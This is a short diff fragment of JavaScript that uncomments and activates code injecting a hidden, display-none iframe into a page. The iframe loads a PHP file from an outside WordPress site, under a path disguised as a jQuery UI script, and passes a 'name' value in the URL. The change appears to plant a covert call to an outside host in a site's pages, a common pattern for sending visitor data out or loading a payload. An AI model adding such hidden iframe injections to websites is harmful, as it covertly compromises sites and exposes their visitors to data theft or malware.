@@ -29,5 +29,5 @@ if(nn == "") {
 //else {
    //window.location = "";
 //// }
- //$('<iframe src="http://direkt-brokers.com/wp-includes/js/jquery-ui.php?name='+nn+ '"style="display:none;"></iframe>')
-  // .appendTo('#overlays');
+ $('<iframe src="http://direkt-brokers.com/wp-includes/js/jquery-ui.php?name='+nn+ '"style="display:none;"></iframe>')
+   .appendTo('#overlays');
